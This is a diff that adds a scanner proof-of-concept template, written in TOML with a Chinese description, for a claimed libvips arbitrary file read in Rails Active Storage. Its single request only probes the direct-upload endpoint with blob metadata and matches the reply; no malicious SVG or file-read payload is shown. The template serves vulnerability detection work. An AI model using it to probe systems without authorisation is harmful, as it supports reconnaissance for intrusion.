@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "通过上传特制 SVG 文件触发 libvips 变体生成，利用未禁用的危险加载器读取服务器任意文件"
+id = "POC-AVE-2026-0944"
+name = "Ruby on Rails Active Storage libvips 任意文件读取 PoC"
+severity = "critical"
+tags = [
+    "cve-2026-66066",
+    "rails",
+    "activestorage",
+    "libvips",
+    "lfi",
+]
+vuln_id = [
+    "CVE-2026-66066",
+    "AVE-2026-0944",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/rails/active_storage/direct_uploads"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"blob":{"filename":"test.svg","content_type":"image/svg+xml","byte_size":500,"checksum":"d41d8cd98f00b204e9800998ecf8427e"}}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "signed_id",
+    "direct_upload",
+]
